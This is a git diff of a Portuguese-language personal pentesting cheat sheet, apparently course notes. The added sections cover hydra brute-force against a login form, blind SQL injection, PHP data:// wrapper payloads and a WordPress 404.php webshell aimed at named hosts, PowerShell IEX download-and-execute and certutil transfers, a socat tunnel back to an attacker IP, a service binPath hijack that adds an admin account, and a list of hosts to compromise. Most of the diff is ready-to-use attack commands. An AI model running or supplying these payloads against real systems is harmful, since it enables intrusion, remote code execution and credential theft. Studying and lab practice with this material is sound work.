@@ -563,44 +563,6 @@ mysql -h 192.168.0.5 -u root
 mysql -u <username> -p -h <hostname> -P <port> <database>
 ```
 
-# wordpress
-```
-wpscan --url http://blog.thm --enumerate ap,at,dbe,cb,u --detection-mode aggressive
-```
-Command Breakdown:
-- ap = All Plugins
-- at = All Themes
-- dbe = Database Exports
-- cb = Config Backups
-- u = Enumerate Users
-- Detection-Mode = Since we’re not worried about being detected we can use aggressive mode which occasionally delivers more results at the cost of generating more noise.
-
-bruteforce de senhas com `XML-RPC` 
-```
-wpscan --url http://blog.thm/ --usernames kwheel,bjoel --passwords ~/wordlist/rockyou.txt
-```
-http://blog.thm/xmlrpc.php
-	XML-RPC server accepts POST requests only.
-
-
-arquivo de configuração:
-contem informações úteis do banco de dados
-```
-cat wp-config.php
-
-
-// ** MySQL settings - You can get this info from your web host ** //
-/** The name of the database for WordPress */
-define('DB_NAME', 'blog');
-
-
-/** MySQL database username */
-define('DB_USER', 'wordpressuser');
-
-/** MySQL database password */
-define('DB_PASSWORD', 'LittleYellowLamp90!@');
-
-```
 
 # msfconsole
 ```
@@ -914,6 +876,9 @@ executar antes
 python3 -m http.server <PORT>
 ```
 
+
+
+
 # cmd
 transferencia do arquivo rev
 ```
@@ -982,6 +947,15 @@ Obs: no ssh é preciso limitar a quantidade de requisições paralelas usando `-
 ```
 hydra -v -l <user> -p <pass> -M <targets> <protocol> 
 hydra -v -L <user_list> -P <pass_list> <protocol>://<ip>:<port> 
+```
+
+bruteforce em http
+```
+hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:LOGIN_BUTTON_NAME=^USER^&PASS_BUTTON_NAME=^PASS^&SUBMIT_BUTTON_NAME:STRING_FILTER"
+
+
+hydra -v -L users.txt -P pass.txt URL http-post-form "/turismo/login.php:login=^USER^&senha=^PASS^&Login:Incorreto"
+
 ```
 
 **Flags úteis:**
@@ -1391,6 +1365,11 @@ describe <table_name>;
 ```
 
 ### SQL injection
+wordlist com payloads para sql injection
+```
+/usr/share/seclists/Fuzzing/SQLi/Generic-SQLi.txt
+```
+
 **error based** 
 ```
 '
@@ -1419,24 +1398,41 @@ exibe os caracteres em hexadecimal
 echo -n 'frase qualquer' | od -An -tdC
 ```
 
+#### Blind
+verifica se a primeira letra do nome da base de dados é `d`
+```
+' and ascii(substring(database(),1,1)) == 100 #
+' and ascii(substring(database(),INDEX,1)) == 100 #
+```
+
+#### sqlmap
+```
+```
+
 ## ferramentas de fuzzing
 - gobuster
 - ffuf
 
 ### gobuster
 
+**fuzzing de diretorios**
 ```
 gobuster dir -u <URL:PORT> -w <WORDLIST> [-x .php,.txt,.bkp,.sql] [-t THREADS] -e [-s HTTP_CODE_RESPONSE] [-a USER_AGENT] 
 ```
 
 ```
-gobuster -u http://10.10.206.2 -w ~/wordlist/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 100 -e 
+gobuster dir -u http://10.10.206.2 -w ~/wordlist/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 100 -e 
 ```
 -e printa a url toda
 -t numero de threads
 -u url
 -x string              File extension(s) to search for (dir mode only)
 -p string              Proxy to use for requests [http(s)://host:port] (dir mode only)
+
+**subdomain enumeration**
+```
+gobuster dns -d grupobusinesscorp.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+```
 
 ### ffuf
 bruteforce de +1 parametro
@@ -1503,14 +1499,15 @@ caso o servidor adicione `.php` automaticamente ao final de `file`, o null byte 
 ```
 GET /index.php?file=/etc/passwd%00 HTTP/1.1
 ```
-FALTA FAZER
-testar o null byte com rfi
-https://academy.desecsecurity.com/novo-pentest-profissional/aula/bkt5ZVZka3RNVFEzTUE9PQ==
+
 ## Local File Inclusion (LFI)
 infecção de logs com LFI/php
 FALTA FAZER (testar no 172.16.1.10)
-https://academy.desecsecurity.com/novo-pentest-profissional/aula/JE1DdkBjTHJNVFEyT1E9PQ==
 
+path com wordlists com payloads de LFI
+```
+/usr/share/seclists/Fuzzing/LFI/
+```
 
 ## XSS
 ferramenta para automatizar teste de XSS
@@ -1528,3 +1525,505 @@ payloads: https://github.com/payloadbox/xss-payload-list
 ### self
 
 ### stored
+
+
+
+## command injection
+
+commix
+```
+commix --url URL --data="site=URL"
+```
+
+## upload image
+imagetragick
+
+## php wrappers
+https://hacktricks.boitatech.com.br/pentesting-web/file-inclusion#lfi-rfi-using-php-wrappers
+```
+file:// — Accessing local filesystem
+http:// — Accessing HTTP(s) URLs
+ftp:// — Accessing FTP(s) URLs
+php:// — Accessing various I/O streams
+zlib:// — Compression Streams
+data:// — Data (RFC 2397)
+glob:// — Find pathnames matching pattern
+phar:// — PHP Archive
+ssh2:// — Secure Shell 2
+rar:// — RAR
+ogg:// — Audio streams
+expect:// — Process Interaction Streams
+```
+php wrappers data
+```
+echo -n '<?php system(id);?>' | base64
+PD9waHAgc3lzdGVtKGlkKTs/Pg==
+
+
+view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKGlkKTs/Pg==
+
+```
+```
+echo -n '<?php echo system($_GET["hack"]);?>' | base64
+PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=
+
+view-source:http://rh.businesscorp.com.br/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImhhY2siXSk7Pz4=&hack=id
+
+```
+## joomla
+```
+joomscan -u URL
+```
+
+## phpmailer
+
+## wordpress
+versão do wordpress
+```
+URL/readme.html
+```
+username in .json file
+```
+URL/wp-json/wp/v2/users/
+```
+ - https://wpscan.com/wordpresses/
+ 
+ wordpress
+```
+wpscan --url URL --enumerate ap,at,dbe,cb,u --detection-mode aggressive
+```
+Command Breakdown:
+- ap = All Plugins
+- at = All Themes
+- dbe = Database Exports
+- cb = Config Backups
+- u = Enumerate Users
+- Detection-Mode = Since we’re not worried about being detected we can use aggressive mode which occasionally delivers more results at the cost of generating more noise.
+
+bruteforce de senhas com `XML-RPC` 
+```
+wpscan --url URL --usernames kwheel,bjoel --passwords ~/wordlist/rockyou.txt
+```
+http://blog.thm/xmlrpc.php
+	XML-RPC server accepts POST requests only.
+
+
+arquivo de configuração `wp-config.php`
+```
+/wp-config.php
+
+// ** MySQL settings - You can get this info from your web host ** //
+/** The name of the database for WordPress */
+define('DB_NAME', 'blog');
+
+
+/** MySQL database username */
+define('DB_USER', 'wordpressuser');
+
+/** MySQL database password */
+define('DB_PASSWORD', 'LittleYellowLamp90!@');
+
+```
+
+path dos plugins/temas
+```
+/wp-content
+```
+
+**estrutura do banco de dados:**
+- https://wp-staging.com/docs/the-wordpress-database-structure/
+- 
+tabelas do banco de dados wordpress
+```
++-----------------------+
+| Tables_in_wordpress   |
++-----------------------+
+| wp_commentmeta        |
+| wp_comments           |
+| wp_links              |
+| wp_options            |
+| wp_postmeta           |
+| wp_posts              |
+| wp_term_relationships |
+| wp_term_taxonomy      |
+| wp_termmeta           |
+| wp_terms              |
+| wp_usermeta           |
+| wp_users              |
+
+```
+
+tabela wp_users
+```
+describe wp_users;
++---------------------+-----------------+------+-----+---------------------+
+| Field               | Type            | Null | Key | Default             |
++---------------------+-----------------+------+-----+---------------------+
+| ID                  | bigint unsigned | NO   | PRI | NULL                |
+| user_login          | varchar(60)     | NO   | MUL |                     |
+| user_pass           | varchar(255)    | NO   |     |                     | 
+| user_nicename       | varchar(50)     | NO   | MUL |                     | 
+| user_url            | varchar(100)    | NO   |     |                     |
+| user_registered     | datetime        | NO   |     | 0000-00-00 00:00:00 |
+| user_activation_key | varchar(255)    | NO   |     |                     |
+| user_status         | int             | NO   |     | 0                   |
+| display_name        | varchar(250)    | NO   |     |                     | 
++---------------------+-----------------+------+-----+---------------------+
+
+```
+
+
+### wp_hash
+cracking hash user_pass
+```
+john --format=phpass HASH.txt --wordlist=WORDLIST.TXT
+
+hashcat -m 400 HASH.txt wordlist.txt
+```
+
+arquivo editavel `wordpress classic` `/themes -> 404.php`
+```
+<?php 
+echo system($_REQUEST['desec']); 
+?> 
+
+<?php 
+echo system($_GET['desec']); 
+?>
+```
+path para themes, `wp-content/themes/classic/404.php`
+```
+http://37.59.174.231/blog/wp-content/themes/classic/404.php?desec=ls%20-la%20/
+```
+
+## OWASP
+livro
+- https://github.com/OWASP/wstg/releases
+youtube
+- https://www.youtube.com/@OWASPGLOBAL/videos
+aplicação vulnerável
+- https://owasp.org/www-project-juice-shop/
+- https://hub.docker.com/r/bkimminich/juice-shop
+
+
+# pós exploração
+
+## transferência de arquivos
+**windows**
+```
+certutil.exe -urlcache -f http://IP:PORT/file.txt output_filename.exe # alerta de trojan
+
+powershell.exe wget URL -Outfile file.exe
+
+powershell -c "wget http://IP:PORT/cred.txt -Outfile filename.txt"
+
+powershell.exe (New-Object System.Net.WebClient).DownloadFtring('URL/file.txt','file.txt')
+
+powershell.exe IEX(New-Object System.Net.WebClient).DownloadString('URL/file.txt') # lê o arquivo .txt e executa as intruções que estiverem nele
+```
+
+**linux**
+```
+wget http://IP/file.exe -O /tmp/file.exe
+curl http://IP/file.exe -o file.exe
+```
+
+
+### via ftp
+o utilitário ftp do windows tem a flag `-s` que permite usarmos um arquivo .txt para especificar os comandos ftp que serão executados. Assim criamos o arquivo ftp.txt com as instruções que desejamos para baixar o arquivo do nosso servidor ftp
+ftp.txt
+```
+open IP
+USER anonymous
+PASS anonymous
+bin
+GET file.exe
+QUIT
+```
+no alvo windows:
+```
+ftp -v -n -s:ftp.txt
+```
+
+servidor ftp com python
+- https://docs.python.org/3/library/ftplib.html
+
+
+### exe2hex
+programa transforma binário em hexadecimal
+
+1. comprimir o arquivo a ser transferido
+   ```
+   upx -9 file.exe
+   ```
+2. exe2hex
+   ```
+   exe2hex -x file.exe -p file.txt
+   ```
+   poderiamos trocar a flag `-p` (powershell) para `-b` batch (sistemas antigos)
+    `-b` BAT      BAT output file (DEBUG.exe method - x86)
+	`-p` POSH     PoSh output file (PowerShell method - x86/x64)
+
+3. copia o conteudo do plink.txt
+   ```
+   cat plink.txt | toclip
+   ```
+4. Reconstrói o arquivo na máquina alvo pelo terminal
+   ```
+   ctrl+v
+   ```
+
+
+### falsificação de assinatura
+Quando o servidor não possui utilitários para envio de arquivos, mas há possibilidade de fazermos upload de arquivos por uma aplicação web, podemos falsificar a assinatura do arquivo suportado, pdf por exemplo, e enviarmos o nosso payload.
+
+### tunneling (linux)
+O tunelamento permite um atacante acessar serviços locais da máquina alvo
+
+#### tunelamento via socat
+atacante
+```
+socat TCP-LISTEN:8443,reuseaddr,fork TCP-LISTEN:2222,reuseaddr
+```
+máquina alvo linux
+```
+socat TCP4:ATACCKER_IP:8443 TCP4:127.0.0.1:22
+```
+
+Agora podemos interagir com o serviço da máquina alvo que roda localmente, através da porta 2222, que está rodando na máquina do atacante.
+
+**obs:** a porta 2222 só será aberta na máquina do atacante a partir do momento que executarmos o tunelamento na máquina alvo.
+
+máquina atacante
+```
+ssh root@127.0.0.1 -p 2222
+```
+Assim estabelecemos conexão com o ssh do servidor alvo que está rodando localmente.
+
+
+#### tunelamento via ssh
+**criando o tunel na máquina atacante**
+```
+ssh -L 3306:localhost:3306 usuario@192.168.1.100
+```
+
+**na máquina atacante, conectando no túnel**
+```
+mysql -h 127.0.0.1 -P 3306 -u usuario_banco -p
+```
+
+```
+ssh -L [porta_local]:[destino]:[porta_destino] [usuário]@[servidor_ssh]
+```
+
+### tunelamento (windows)
+falta fazer, precisa do plink e ncat
+subir ssh na maquina do pentester
+```
+service ssh start
+```
+
+executar plink na servidor alvo
+```
+
+```
+
+
+## Privilege escalation
+### windows
+mostra o usuário logado
+```
+whoami
+```
+mostra os grupos do usuario
+```
+whoami /groups
+net user [USER]
+```
+exibe todos os usuários
+```
+net user
+```
+informações do sistema (adaptador de rede, DHCP ativo/desativado, versão do sistema 32/64 bits)
+```
+systeminfo
+```
+exibe o hostname do sistema
+```
+hostname
+```
+exibe os processos em execução e o serviço associado ao processo
+```
+tasklist /SVC
+```
+lista os adaptadores de rede
+```
+ipconfig /all
+```
+no caso de estarmos em um AD, o servidor DNS primário provavelmente é servidor AD na saida do comando `ipconfig /all`
+
+executa comando com privilegio de um usuário especifico
+```
+runas /user:[USERNAME] [COMMAND]
+```
+informações da rede
+```
+arp -a
+route print
+```
+verifica serviços ativos 
+```
+sc query [windefend]
+```
+verifica se o firewall esta ativo
+```
+netsh advfirewall show currentprofile
+```
+busca recursiva por arquivo
+```
+where /R c:\ file.txt 
+```
+busca por string em arquivos .txt
+```
+findstr /s "pass=" *.txt
+```
+- o comando `findstr` é equivalente ao comando grep do linux
+
+Scan automatizados
+- **Winpeas** https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS
+- **wesng** https://github.com/bitsadmin/wesng
+	1. colocar a saida do systeminfo no mesmo diretório que o arquivo `wes.py`
+	2. `python wes.py -e systeminfo.txt`
+ 
+
+#### bypass UAC
+SystemInternals https://learn.microsoft.com/en-us/sysinternals/downloads/
+
+##### utilitários do SystemInternals
+verifica o modo de execução do processo
+```
+sigcheck.exe -a -m C:\Windows\System32\notepad.exe
+```
+procmon para monitorar o processo alvo
+```
+procmon.exe
+```
+
+accesschk.exe exibe processos que tenhamos permissão de Read and Write
+```
+accesschk.exe -wvcu "Users" *
+```
+* `*`: busca em todos os serviços
+
+
+
+cve2019-1388 (execução do internet explorar com permissão de administrador)
+##### PrivEsc services
+wmic
+```
+wmic service get Name,State,PathName
+
+wmic service get Name,State,PathName | findstr "running"
+
+wmic service get Name,State,PathName | findstr "running" | findstr "Program"
+```
+obs: uma dica é procurar por programas instalados pelo usuários, possivelmente teremos um serviço mal configurado
+
+
+**bypass para o caso de podermos alterar o binpath**
+exibe as permissões do usuário atual para um determinador serviço
+```
+icacls PATH_TO_.EXE
+
+icacls C:\Windows\System32\cmd.exe
+
+sc query [SERVICE_NAME]
+sc qc [SERVICE_NAME]
+```
+
+alterando o pathbin para executar comando
+```
+sc config [SERVICE_NAME] binPath="net user hack Admin@123 /add"
+
+sc stop [SERVICE_NAME]
+sc start [SERVICE_NAME]
+```
+
+
+**bypass para o caso de conseguirmos substituir o serviço**
+basta substituir o arquivo .exe por uma backdoor
+
+se o serviço for auto-start precisaremos reiniciar a máquina para executarmos a nossa backdoor
+```
+shutdown /r /t 0
+```
+
+
+
+## linux
+enumeração de usuários e serviços
+```
+cat /etc/passwd
+```
+exibe o nome da maquina
+```
+hostname
+```
+versão do kernel e do sistema operacional
+```
+uname -a
+cat /etc/issue
+cat /etc/*-release
+```
+exibe a versão de um serviço
+```
+dpkg -l | grep wget 
+```
+configuração de rede/portas
+```
+ifconfig -a
+route
+
+netstat -nlpt # portas TCP abertas
+netstat -nlpu # portas UDP abertas
+```
+processos em execução
+```
+ps aux
+```
+agendamento de tarefas automatizadas no crontab
+```
+cat /etc/crontab
+```
+buscar por diretórios que tenho permissão de escrita
+```
+find / -writable -type d 2>/dev/null
+```
+procura por arquivos que possuem o bit SUID ativado
+```
+find / -perm -u=s -type f 2>/dev/null
+```
+pesquisa por arquivos em que todos os usuários tenham permissão RWE
+```
+find / -type f -perm 777 2>/dev/null
+```
+configuração do sudo
+```
+sudo -l
+```
+
+script para scan automatizado
+- linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/tag/20250202-a3a1123d
+- linuex exploit suggester https://github.com/The-Z-Labs/linux-exploit-suggester
+
+
+## Pivoting
+falta fazer
+rh.business
+# dever de casa
+comprometer os hosts 
+172.30.0.15
+172.30.0.20
+172.30.0.30
+172.30.0.40
+172.30.0.200
